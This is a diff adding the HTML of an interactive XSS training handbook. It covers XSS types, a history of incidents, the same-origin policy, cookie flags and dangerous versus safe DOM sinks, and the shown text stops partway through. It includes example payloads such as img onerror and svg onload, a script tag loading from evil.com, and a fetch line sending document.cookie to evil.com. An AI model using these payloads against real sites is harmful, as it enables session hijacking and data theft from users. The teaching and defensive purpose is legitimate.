@@ -1,0 +1,3201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Complete Interactive XSS Vulnerability Handbook — Learn Reflected, Stored, DOM-Based, Blind & Self XSS with hands-on labs.">
+    <title>XSS Security Handbook — Interactive Learning Platform</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
+<body>
+
+<!-- ============================================================
+     XSS ALERT MODAL (Simulation)
+     ============================================================ -->
+<div class="xss-modal-overlay" id="xssModal">
+    <div class="xss-modal">
+        <div class="xss-modal-header">⚠️</div>
+        <h3 id="modalTitle">XSS Attack Simulated!</h3>
+        <p id="modalBody">This demonstrates what a real XSS attack would accomplish. An attacker could steal the following data:</p>
+        <div class="xss-modal-cookie" id="modalCookie">sessionId=abc123; authToken=secret789</div>
+        <p style="font-size:0.76rem;color:var(--text-dim);margin-top:10px;">🔬 This is a SAFE SIMULATION for learning purposes only. No real data is exposed.</p>
+        <button class="xss-modal-close" onclick="closeXSSModal()">I Understand — Close</button>
+    </div>
+</div>
+
+<!-- ============================================================
+     NAVBAR
+     ============================================================ -->
+<nav class="navbar">
+    <div class="nav-logo">
+        <div class="nav-logo-shield">🛡️</div>
+        <span class="nav-logo-text">XSS Handbook</span>
+    </div>
+
+    <div class="nav-spacer"></div>
+
+    <!-- Handbook External Link Button -->
+    <a href="https://potdf.gitbook.io/bug-hunt-book/learning/xss-injection-handbook" target="_blank" rel="noopener noreferrer" class="nav-handbook-btn">
+        <span class="btn-icon">📖</span>
+        <span>Visit Full Handbook</span>
+        <span class="external-icon">↗</span>
+    </a>
+
+    <!-- Progress -->
+    <div class="nav-progress-wrapper">
+        <span class="nav-progress-label" id="navProgressLabel">0 / 9 Topics</span>
+        <div class="nav-progress-track">
+            <div class="nav-progress-fill" id="navProgressFill"></div>
+        </div>
+    </div>
+
+    <!-- Mobile menu button -->
+    <button class="nav-menu-btn" id="menuBtn" onclick="toggleSidebar()">☰</button>
+</nav>
+
+<!-- ============================================================
+     SIDEBAR
+     ============================================================ -->
+<aside class="sidebar" id="sidebar">
+    <div class="sidebar-logo-area">
+        <div class="sidebar-completion">
+            <span class="sidebar-completion-text">Course Progress</span>
+            <span class="sidebar-completion-pct" id="sidebarProgressPct">0%</span>
+        </div>
+        <div class="sidebar-progress">
+            <div class="sidebar-progress-fill" id="sidebarProgressFill"></div>
+        </div>
+    </div>
+
+    <nav class="sidebar-nav">
+
+        <!-- FUNDAMENTALS -->
+        <div class="sidebar-section-label">Fundamentals</div>
+
+        <div class="sidebar-item active" id="nav-0" onclick="navigateTo(0)">
+            <div class="s-icon" style="background:rgba(108,99,255,0.18)">🏠</div>
+            <div class="s-text">
+                <div class="s-title">Introduction</div>
+                <div class="s-sub">What, Why & Impact</div>
+            </div>
+            <div class="s-check" id="check-0">✓</div>
+        </div>
+
+        <div class="sidebar-item" id="nav-1" onclick="navigateTo(1)">
+            <div class="s-icon" style="background:rgba(0,221,255,0.15)">🧠</div>
+            <div class="s-text">
+                <div class="s-title">Web Fundamentals</div>
+                <div class="s-sub">SOP, DOM, Cookies, Encoding</div>
+            </div>
+            <div class="s-check" id="check-1"></div>
+        </div>
+
+        <!-- XSS TYPES -->
+        <div class="sidebar-section-label">XSS Types</div>
+
+        <div class="sidebar-item" id="nav-2" onclick="navigateTo(2)">
+            <div class="s-icon" style="background:rgba(255,136,0,0.15)">↩️</div>
+            <div class="s-text">
+                <div class="s-title">Reflected XSS</div>
+                <div class="s-sub">Non-persistent + Lab</div>
+            </div>
+            <div class="s-check" id="check-2"></div>
+        </div>
+
+        <div class="sidebar-item" id="nav-3" onclick="navigateTo(3)">
+            <div class="s-icon" style="background:rgba(213,0,0,0.15)">💾</div>
+            <div class="s-text">
+                <div class="s-title">Stored XSS</div>
+                <div class="s-sub">Persistent + Lab</div>
+            </div>
+            <div class="s-check" id="check-3"></div>
+        </div>
+
+        <div class="sidebar-item" id="nav-4" onclick="navigateTo(4)">
+            <div class="s-icon" style="background:rgba(0,221,255,0.15)">🔀</div>
+            <div class="s-text">
+                <div class="s-title">DOM-Based XSS</div>
+                <div class="s-sub">Client-side + Lab</div>
+            </div>
+            <div class="s-check" id="check-4"></div>
+        </div>
+
+        <div class="sidebar-item" id="nav-5" onclick="navigateTo(5)">
+            <div class="s-icon" style="background:rgba(170,68,255,0.15)">👁️</div>
+            <div class="s-text">
+                <div class="s-title">Other XSS Types</div>
+                <div class="s-sub">Blind XSS, Self-XSS</div>
+            </div>
+            <div class="s-check" id="check-5"></div>
+        </div>
+
+        <!-- EXPLOITATION -->
+        <div class="sidebar-section-label">Exploitation</div>
+
+        <div class="sidebar-item" id="nav-6" onclick="navigateTo(6)">
+            <div class="s-icon" style="background:rgba(245,0,87,0.15)">💀</div>
+            <div class="s-text">
+                <div class="s-title">Attack Techniques</div>
+                <div class="s-sub">Payloads, Bypasses, Impact</div>
+            </div>
+            <div class="s-check" id="check-6"></div>
+        </div>
+
+        <!-- DEFENSE -->
+        <div class="sidebar-section-label">Defense</div>
+
+        <div class="sidebar-item" id="nav-7" onclick="navigateTo(7)">
+            <div class="s-icon" style="background:rgba(0,200,83,0.15)">🛡️</div>
+            <div class="s-text">
+                <div class="s-title">Prevention</div>
+                <div class="s-sub">Encoding, CSP, Sanitization</div>
+            </div>
+            <div class="s-check" id="check-7"></div>
+        </div>
+
+        <div class="sidebar-item" id="nav-8" onclick="navigateTo(8)">
+            <div class="s-icon" style="background:rgba(255,204,0,0.15)">🔍</div>
+            <div class="s-text">
+                <div class="s-title">Detection & Summary</div>
+                <div class="s-sub">Tools, Comparison, Cheatsheet</div>
+            </div>
+            <div class="s-check" id="check-8"></div>
+        </div>
+
+    </nav>
+</aside>
+
+<!-- ============================================================
+     MAIN CONTENT
+     ============================================================ -->
+<main class="main-wrap">
+
+<!-- ================================================================
+     PAGE 0 — INTRODUCTION
+     ================================================================ -->
+<div class="page active" id="page-0">
+
+    <!-- HERO -->
+    <div class="hero">
+        <div class="hero-bg"></div>
+        <div class="hero-grid"></div>
+        <div class="hero-content">
+            <span class="hero-emoji">⚔️</span>
+            <h1>XSS Security Handbook</h1>
+            <p class="hero-tagline">A complete interactive guide to understanding, exploiting (ethically), and defending against Cross-Site Scripting — the most widespread web vulnerability.</p>
+            <button class="hero-cta" onclick="navigateTo(1)">
+                Start Learning →
+            </button>
+            <div class="hero-stats">
+                <div class="hero-stat">
+                    <span class="hero-stat-num">9</span>
+                    <span class="hero-stat-label">Topics</span>
+                </div>
+                <div class="hero-stat">
+                    <span class="hero-stat-num">3</span>
+                    <span class="hero-stat-label">Live Labs</span>
+                </div>
+                <div class="hero-stat">
+                    <span class="hero-stat-num">5</span>
+                    <span class="hero-stat-label">XSS Types</span>
+                </div>
+                <div class="hero-stat">
+                    <span class="hero-stat-num">65%</span>
+                    <span class="hero-stat-label">Sites Vulnerable</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <div class="page-header">
+        <div class="chapter-badge badge-intro">📖 Chapter 1</div>
+        <h1 class="page-title">Introduction to XSS</h1>
+        <p class="page-subtitle">Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows attackers to execute malicious scripts in other users' browsers. Understanding it is essential for every developer and security professional.</p>
+    </div>
+
+    <!-- WHAT IS XSS -->
+    <h2 class="section-heading"><span class="sh-icon">🎯</span> What is Cross-Site Scripting?</h2>
+
+    <p class="body-text">
+        Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts — typically JavaScript — into web content viewed by other users. The victim's browser <strong>executes the script because it trusts content from the website's origin</strong>, not knowing the script was injected by an attacker.
+    </p>
+
+    <div class="info-box purple">
+        <div class="ib-icon">💡</div>
+        <div class="ib-content">
+            <strong>OWASP Definition:</strong>
+            <p>"Cross-Site Scripting attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end user."</p>
+        </div>
+    </div>
+
+    <div class="info-box info">
+        <div class="ib-icon">🔤</div>
+        <div class="ib-content">
+            <strong>Why "XSS" and not "CSS"?</strong>
+            <p>The abbreviation is XSS (not CSS) to avoid confusion with Cascading Style Sheets. The "X" stands for "Cross" in Cross-Site Scripting.</p>
+        </div>
+    </div>
+
+    <!-- STATS -->
+    <h2 class="section-heading"><span class="sh-icon">📊</span> Why Should You Care?</h2>
+
+    <div class="grid-4">
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,#ff4444,#ff8800);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">65%</span>
+            <span class="stat-label">of web apps are vulnerable</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,var(--primary),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;">#3</span>
+            <span class="stat-label">OWASP Top 10 (Injection)</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,#ffcc00,#ff8800);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">#1</span>
+            <span class="stat-label">Bug bounty vulnerability</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-num" style="background:linear-gradient(135deg,#ff44aa,#aa44ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">$$$</span>
+            <span class="stat-label">Multi-million $ breaches</span>
+        </div>
+    </div>
+
+    <!-- CIA TRIAD -->
+    <h2 class="section-heading"><span class="sh-icon">🔺</span> XSS & the CIA Triad</h2>
+
+    <div class="grid-3">
+        <div class="card card-accent-red">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(213,0,0,0.15)">🔐</div>
+                Confidentiality
+            </div>
+            <p class="body-text mb-0" style="font-size:0.88rem;">XSS can <strong>steal sensitive data</strong> — session cookies, authentication tokens, personal information, and form data (including passwords and credit cards).</p>
+            <div class="flex flex-gap-8 flex-wrap mt-8">
+                <span class="tag tag-red">Cookie Theft</span>
+                <span class="tag tag-red">Data Exfiltration</span>
+                <span class="tag tag-red">Keylogging</span>
+            </div>
+        </div>
+        <div class="card card-accent-orange">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(255,109,0,0.15)">✏️</div>
+                Integrity
+            </div>
+            <p class="body-text mb-0" style="font-size:0.88rem;">Attackers can <strong>modify page content</strong> — inject fake login forms, deface websites, alter displayed data, and perform actions on behalf of users.</p>
+            <div class="flex flex-gap-8 flex-wrap mt-8">
+                <span class="tag tag-orange">Phishing</span>
+                <span class="tag tag-orange">Defacement</span>
+                <span class="tag tag-orange">CSRF via XSS</span>
+            </div>
+        </div>
+        <div class="card card-accent-yellow">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(255,204,0,0.15)">⚡</div>
+                Availability
+            </div>
+            <p class="body-text mb-0" style="font-size:0.88rem;">Malicious scripts can cause <strong>denial of service</strong> — infinite loops, resource exhaustion, crypto mining, or redirecting users away from the site.</p>
+            <div class="flex flex-gap-8 flex-wrap mt-8">
+                <span class="tag tag-yellow">Crypto Mining</span>
+                <span class="tag tag-yellow">Infinite Loops</span>
+                <span class="tag tag-yellow">Redirects</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- 5 TYPES OVERVIEW -->
+    <h2 class="section-heading"><span class="sh-icon">🌐</span> 5 Types of XSS at a Glance</h2>
+
+    <div class="grid-3" style="margin-bottom:10px;">
+        <div class="xss-card reflected" onclick="navigateTo(2)">
+            <div class="xss-card-icon" style="background:rgba(255,136,0,0.15)">↩️</div>
+            <h3 style="color:var(--orange)">Reflected XSS</h3>
+            <p>Non-persistent. Payload is in the URL and reflected by the server. Requires victim to click a malicious link.</p>
+            <div class="xss-card-tags">
+                <span class="tag tag-orange">Non-Persistent</span>
+                <span class="tag tag-yellow">Most Common</span>
+            </div>
+        </div>
+        <div class="xss-card stored" onclick="navigateTo(3)">
+            <div class="xss-card-icon" style="background:rgba(213,0,0,0.15)">💾</div>
+            <h3 style="color:var(--red)">Stored XSS</h3>
+            <p>Persistent. Payload is stored on the server. Executes for every user who views the infected content.</p>
+            <div class="xss-card-tags">
+                <span class="tag tag-red">Persistent</span>
+                <span class="tag tag-red">Critical Impact</span>
+            </div>
+        </div>
+        <div class="xss-card dom" onclick="navigateTo(4)">
+            <div class="xss-card-icon" style="background:rgba(0,221,255,0.15)">🔀</div>
+            <h3 style="color:var(--cyan)">DOM-Based XSS</h3>
+            <p>Client-side only. Server never sees the payload. Exploits JavaScript DOM manipulation in the browser.</p>
+            <div class="xss-card-tags">
+                <span class="tag tag-cyan">Client-Side</span>
+                <span class="tag tag-blue">Hard to Detect</span>
+            </div>
+        </div>
+    </div>
+    <div class="grid-2">
+        <div class="xss-card blind" onclick="navigateTo(5)">
+            <div class="xss-card-icon" style="background:rgba(120,120,160,0.15)">👁️‍🗨️</div>
+            <h3 style="color:var(--text-muted)">Blind XSS</h3>
+            <p>Stored XSS variant where payload executes in a hidden context the attacker can't directly see — like an admin panel, log viewer, or internal tool.</p>
+            <div class="xss-card-tags">
+                <span class="tag tag-gray">Hidden Execution</span>
+                <span class="tag tag-red">Critical</span>
+            </div>
+        </div>
+        <div class="xss-card self-xss" onclick="navigateTo(5)">
+            <div class="xss-card-icon" style="background:rgba(170,68,255,0.15)">🪞</div>
+            <h3 style="color:var(--purple)">Self-XSS</h3>
+            <p>Only affects the user who inputs it. Not exploitable against others unless chained with CSRF or login CSRF to trick a victim.</p>
+            <div class="xss-card-tags">
+                <span class="tag tag-purple">Self-Harm</span>
+                <span class="tag tag-blue">Low Severity</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- WHAT CAN XSS DO -->
+    <h2 class="section-heading"><span class="sh-icon">💥</span> What Can XSS Do?</h2>
+
+    <div class="grid-auto">
+        <div class="card">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(213,0,0,0.15)">🍪</div>
+                Cookie & Session Theft
+            </div>
+            <p class="body-text mb-0" style="font-size:0.85rem;">Steal session cookies to impersonate users and hijack their accounts without knowing their passwords.</p>
+        </div>
+        <div class="card">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(255,109,0,0.15)">⌨️</div>
+                Keylogging
+            </div>
+            <p class="body-text mb-0" style="font-size:0.85rem;">Record every keystroke a user types — passwords, credit card numbers, private messages — and send them to the attacker.</p>
+        </div>
+        <div class="card">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(245,0,87,0.15)">🎭</div>
+                Phishing Overlays
+            </div>
+            <p class="body-text mb-0" style="font-size:0.85rem;">Inject convincing fake login forms over legitimate pages, tricking users into submitting their credentials to the attacker.</p>
+        </div>
+        <div class="card">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(108,99,255,0.15)">🔄</div>
+                Account Takeover
+            </div>
+            <p class="body-text mb-0" style="font-size:0.85rem;">Perform actions as the victim — change emails, passwords, make purchases, delete data, or transfer funds.</p>
+        </div>
+        <div class="card">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(0,200,83,0.15)">🐛</div>
+                Worm Propagation
+            </div>
+            <p class="body-text mb-0" style="font-size:0.85rem;">Create self-replicating XSS worms that spread from user to user automatically, like the infamous Samy worm on MySpace.</p>
+        </div>
+        <div class="card">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(255,204,0,0.15)">🔍</div>
+                Internal Network Scanning
+            </div>
+            <p class="body-text mb-0" style="font-size:0.85rem;">Use the victim's browser as a proxy to scan internal networks, discover services, and access resources behind firewalls.</p>
+        </div>
+    </div>
+
+    <!-- HISTORY -->
+    <h2 class="section-heading"><span class="sh-icon">📅</span> Brief History of XSS</h2>
+
+    <div class="card">
+        <div class="timeline">
+            <div class="timeline-item">
+                <div class="timeline-year">1999</div>
+                <div class="timeline-title">XSS Term Coined</div>
+                <div class="timeline-desc">Microsoft engineers coin "Cross-Site Scripting" while analyzing browser security vulnerabilities.</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">2005 <span class="tag tag-red" style="margin-left:6px;">Major Incident</span></div>
+                <div class="timeline-title">Samy Worm — MySpace</div>
+                <div class="timeline-desc">Samy Kamkar creates a self-propagating XSS worm that infects 1 million+ MySpace profiles in just 20 hours. He is later arrested and sentenced to probation.</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">2007</div>
+                <div class="timeline-title">XSS Becomes #1</div>
+                <div class="timeline-desc">XSS surpasses buffer overflows as the most commonly reported vulnerability type.</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">2010</div>
+                <div class="timeline-title">Apache Foundation Compromised</div>
+                <div class="timeline-desc">Apache Foundation hacked via XSS in Atlassian JIRA, leading to infrastructure compromise.</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">2018 <span class="tag tag-red" style="margin-left:6px;">£20M Fine</span></div>
+                <div class="timeline-title">British Airways Breach</div>
+                <div class="timeline-desc">Magecart group injects card-skimming JavaScript into BA's payment page. 380,000 card details stolen over 15 days. ICO issues £20 million GDPR fine.</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">2019</div>
+                <div class="timeline-title">Fortnite — 200M+ Users at Risk</div>
+                <div class="timeline-desc">Check Point Research discovers XSS + OAuth misconfiguration on an old Epic Games subdomain that could compromise 200 million+ Fortnite accounts.</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">2021</div>
+                <div class="timeline-title">OWASP A03:2021 — Injection</div>
+                <div class="timeline-desc">OWASP consolidates XSS under the broader "Injection" category in the 2021 Top 10, ranking it #3.</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">2023-2024</div>
+                <div class="timeline-title">AI/LLM Web Interface XSS</div>
+                <div class="timeline-desc">Multiple XSS vulnerabilities discovered in AI chatbot web interfaces, proving even cutting-edge applications are vulnerable.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- LEGAL WARNING -->
+    <div class="info-box warning" style="margin-top:30px;">
+        <div class="ib-icon">⚖️</div>
+        <div class="ib-content">
+            <strong>Legal & Ethical Notice</strong>
+            <p>All labs in this handbook are safe simulations. <strong>Never test for XSS on systems you don't own or have explicit written authorization to test.</strong> Unauthorized testing violates the Computer Fraud and Abuse Act (USA), Computer Misuse Act (UK), and similar laws worldwide. Penalties include criminal prosecution, fines, and imprisonment.</p>
+        </div>
+    </div>
+
+    <!-- CTA -->
+    <div class="feature-highlight text-center" style="margin-top:30px;">
+        <p style="font-size:1rem;margin-bottom:16px;">Ready to begin your XSS security journey?</p>
+        <div class="flex flex-center flex-gap-12">
+            <button class="btn btn-primary" onclick="navigateTo(1)" style="font-size:1rem;padding:14px 32px;">
+                Start Learning →
+            </button>
+            <a href="https://potdf.gitbook.io/bug-hunt-book/learning/xss-injection-handbook" target="_blank" rel="noopener noreferrer" class="btn btn-outline">
+                📖 Read Full Handbook ↗
+            </a>
+        </div>
+    </div>
+
+    <!-- NAV -->
+    <div class="page-nav">
+        <div></div>
+        <button class="btn btn-primary" onclick="navigateTo(1)">Next: Web Fundamentals →</button>
+    </div>
+</div>
+
+
+<!-- ================================================================
+     PAGE 1 — WEB FUNDAMENTALS
+     ================================================================ -->
+<div class="page" id="page-1">
+    <div class="page-header">
+        <div class="chapter-badge badge-concept">🧠 Chapter 2</div>
+        <h1 class="page-title">Web Fundamentals</h1>
+        <p class="page-subtitle">Before diving into XSS attacks, you must understand how browsers work, the Same-Origin Policy, how cookies manage sessions, and how the DOM renders pages.</p>
+    </div>
+
+    <!-- SOP -->
+    <h2 class="section-heading"><span class="sh-icon">🌐</span> The Same-Origin Policy (SOP)</h2>
+
+    <p class="body-text">
+        The Same-Origin Policy is the <strong>most critical browser security mechanism</strong> relevant to XSS. It restricts how scripts from one origin can interact with resources from another origin. An "origin" is defined by three components:
+    </p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+            <span class="code-lang">URL Anatomy</span>
+        </div>
+        <div class="code-body">    https://www.example.com:443/path/page.html
+    ─────   ───────────────  ───
+      │           │           │
+   <span class="c-keyword">Scheme</span>       <span class="c-func">Host</span>        <span class="c-string">Port</span>
+
+    ←──────── <span class="c-danger">ORIGIN</span> ────────→</div>
+    </div>
+
+    <div class="tbl-wrap">
+        <table class="data-table">
+            <thead>
+                <tr><th>URL A</th><th>URL B</th><th>Same Origin?</th><th>Reason</th></tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>http://example.com/a</code></td>
+                    <td><code>http://example.com/b</code></td>
+                    <td><span class="check-yes">✅ Yes</span></td>
+                    <td>Same scheme, host, port</td>
+                </tr>
+                <tr>
+                    <td><code>http://example.com</code></td>
+                    <td><code>https://example.com</code></td>
+                    <td><span class="check-no">❌ No</span></td>
+                    <td>Different scheme (http vs https)</td>
+                </tr>
+                <tr>
+                    <td><code>http://example.com</code></td>
+                    <td><code>http://sub.example.com</code></td>
+                    <td><span class="check-no">❌ No</span></td>
+                    <td>Different host (subdomain)</td>
+                </tr>
+                <tr>
+                    <td><code>http://example.com</code></td>
+                    <td><code>http://example.com:8080</code></td>
+                    <td><span class="check-no">❌ No</span></td>
+                    <td>Different port</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="info-box danger">
+        <div class="ib-icon">🔑</div>
+        <div class="ib-content">
+            <strong>Why SOP Matters for XSS:</strong>
+            <p>When XSS succeeds, the malicious script runs <strong>within the origin of the vulnerable website</strong>, effectively <em>bypassing</em> SOP completely. The browser sees the injected script as legitimate code from the trusted site!</p>
+        </div>
+    </div>
+
+    <!-- HOW HTTP WORKS -->
+    <h2 class="section-heading"><span class="sh-icon">📡</span> HTTP Request-Response Cycle</h2>
+
+    <div class="flow-container">
+        <div class="flow-horizontal" style="justify-content:center;">
+            <div class="flow-step">
+                <div class="flow-step-num">1</div>
+                <div class="flow-box flow-box-victim">🖥️ Client<br>(Browser)</div>
+                <div class="flow-step-label">User's Browser</div>
+            </div>
+            <div class="flow-arrow">──→<br><span style="font-size:0.65rem;color:var(--text-dim)">HTTP Request<br>GET /search?q=test</span></div>
+            <div class="flow-step">
+                <div class="flow-step-num">2</div>
+                <div class="flow-box flow-box-server">🖥️ Server<br>(Backend)</div>
+                <div class="flow-step-label">Processes Request</div>
+            </div>
+            <div class="flow-arrow">──→<br><span style="font-size:0.65rem;color:var(--text-dim)">HTTP Response<br>HTML + JS + CSS</span></div>
+            <div class="flow-step">
+                <div class="flow-step-num">3</div>
+                <div class="flow-box flow-box-browser">🌐 DOM<br>(Rendered)</div>
+                <div class="flow-step-label">Browser Renders Page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- COOKIES -->
+    <h2 class="section-heading"><span class="sh-icon">🍪</span> Cookies & Session Management</h2>
+
+    <p class="body-text">
+        Cookies are how web applications track user sessions. When a user logs in, the server creates a session and sends a cookie to the browser. <strong>If an attacker can steal this cookie via XSS, they can impersonate the user.</strong>
+    </p>
+
+    <div class="tbl-wrap">
+        <table class="data-table">
+            <thead>
+                <tr><th>Cookie Flag</th><th>Purpose</th><th>Prevents XSS Cookie Theft?</th></tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>HttpOnly</strong></td>
+                    <td>Prevents JavaScript from accessing the cookie via <code>document.cookie</code></td>
+                    <td><span class="check-yes">✅ YES — Primary defense</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Secure</strong></td>
+                    <td>Cookie only sent over HTTPS connections</td>
+                    <td><span class="check-mid">⚠️ Partial (protects transit)</span></td>
+                </tr>
+                <tr>
+                    <td><strong>SameSite=Strict</strong></td>
+                    <td>Cookie never sent in cross-site requests</td>
+                    <td><span class="check-mid">⚠️ Partial (prevents CSRF)</span></td>
+                </tr>
+                <tr>
+                    <td><strong>SameSite=Lax</strong></td>
+                    <td>Cookie sent in top-level navigations only</td>
+                    <td><span class="check-mid">⚠️ Partial</span></td>
+                </tr>
+                <tr>
+                    <td><strong>No Flags</strong></td>
+                    <td>Default — no extra protections</td>
+                    <td><span class="check-no">❌ VULNERABLE</span></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="grid-2">
+        <div class="code-block">
+            <div class="code-header">
+                <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                <span class="code-lang">Without HttpOnly</span>
+            </div>
+            <div class="code-body"><span class="c-comment">// ❌ Cookie is ACCESSIBLE to JavaScript</span>
+console.log(<span class="c-danger">document.cookie</span>);
+<span class="c-comment">// Output: "sessionId=abc123; token=xyz789"</span>
+
+<span class="c-comment">// Attacker can steal it:</span>
+<span class="c-danger">fetch('https://evil.com?c=' + document.cookie)</span>;</div>
+        </div>
+        <div class="code-block">
+            <div class="code-header">
+                <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                <span class="code-lang">With HttpOnly ✅</span>
+            </div>
+            <div class="code-body"><span class="c-comment">// ✅ Cookie is HIDDEN from JavaScript</span>
+console.log(<span class="c-safe">document.cookie</span>);
+<span class="c-comment">// Output: "" (empty string!)</span>
+
+<span class="c-comment">// Cookie still sent in HTTP headers</span>
+<span class="c-comment">// but JS can't read it = safe from XSS</span></div>
+        </div>
+    </div>
+
+    <!-- DOM -->
+    <h2 class="section-heading"><span class="sh-icon">🌳</span> The Document Object Model (DOM)</h2>
+
+    <p class="body-text">
+        The DOM is a tree-like representation of an HTML page that JavaScript can read and modify. Understanding the DOM is crucial because <strong>DOM-based XSS exploits happen when JavaScript writes user-controlled data into dangerous DOM sinks</strong>.
+    </p>
+
+    <div class="grid-2">
+        <div class="card card-accent-red">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(213,0,0,0.15)">⚠️</div>
+                Dangerous DOM Methods (Sinks)
+            </div>
+            <div class="code-block mb-0">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">JavaScript — AVOID with user input</span>
+                </div>
+                <div class="code-body"><span class="c-danger">element.innerHTML = userInput;</span>
+<span class="c-danger">element.outerHTML = userInput;</span>
+<span class="c-danger">document.write(userInput);</span>
+<span class="c-danger">eval(userInput);</span>
+<span class="c-danger">setTimeout(userInput, 1000);</span>
+<span class="c-danger">location.href = userInput;</span>
+<span class="c-danger">jQuery('#el').html(userInput);</span></div>
+            </div>
+        </div>
+        <div class="card card-accent-green">
+            <div class="card-title">
+                <div class="ct-icon" style="background:rgba(0,200,83,0.15)">✅</div>
+                Safe DOM Methods
+            </div>
+            <div class="code-block mb-0">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">JavaScript — SAFE to use</span>
+                </div>
+                <div class="code-body"><span class="c-safe">element.textContent = userInput;</span>
+<span class="c-safe">element.setAttribute('value', input);</span>
+<span class="c-safe">element.classList.add(safeClass);</span>
+<span class="c-safe">document.createTextNode(input);</span>
+<span class="c-safe">jQuery('#el').text(userInput);</span>
+<span class="c-comment">// Always validate URLs before using!</span>
+<span class="c-comment">// Use textContent, NOT innerHTML</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- WHERE JS CAN EXECUTE -->
+    <h2 class="section-heading"><span class="sh-icon">📍</span> Where JavaScript Can Execute in HTML</h2>
+
+    <p class="body-text">
+        Understanding every place JavaScript can execute is key to finding XSS. Attackers exploit any of these execution contexts:
+    </p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+            <span class="code-lang">HTML — 6 JavaScript Execution Contexts</span>
+            <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+        </div>
+        <div class="code-body"><span class="c-comment">/* 1. Script Tags */</span>
+<span class="c-tag">&lt;script&gt;</span>alert(<span class="c-string">'Executes here'</span>)<span class="c-tag">&lt;/script&gt;</span>
+<span class="c-tag">&lt;script</span> <span class="c-attr">src</span>=<span class="c-string">"https://evil.com/malicious.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>
+
+<span class="c-comment">/* 2. Event Handlers (50+ events!) */</span>
+<span class="c-tag">&lt;img</span> <span class="c-attr">src</span>=<span class="c-string">x</span> <span class="c-danger">onerror</span>=<span class="c-string">"alert('XSS')"</span><span class="c-tag">&gt;</span>
+<span class="c-tag">&lt;body</span> <span class="c-danger">onload</span>=<span class="c-string">"alert('XSS')"</span><span class="c-tag">&gt;</span>
+<span class="c-tag">&lt;div</span> <span class="c-danger">onmouseover</span>=<span class="c-string">"alert('XSS')"</span><span class="c-tag">&gt;</span>Hover me<span class="c-tag">&lt;/div&gt;</span>
+<span class="c-tag">&lt;input</span> <span class="c-danger">onfocus</span>=<span class="c-string">"alert('XSS')"</span> <span class="c-attr">autofocus</span><span class="c-tag">&gt;</span>
+<span class="c-tag">&lt;details</span> <span class="c-attr">open</span> <span class="c-danger">ontoggle</span>=<span class="c-string">"alert('XSS')"</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">/* 3. JavaScript URI Scheme */</span>
+<span class="c-tag">&lt;a</span> <span class="c-attr">href</span>=<span class="c-danger">"javascript:alert('XSS')"</span><span class="c-tag">&gt;</span>Click me<span class="c-tag">&lt;/a&gt;</span>
+
+<span class="c-comment">/* 4. SVG Elements */</span>
+<span class="c-tag">&lt;svg</span> <span class="c-danger">onload</span>=<span class="c-string">"alert('XSS')"</span><span class="c-tag">&gt;&lt;/svg&gt;</span>
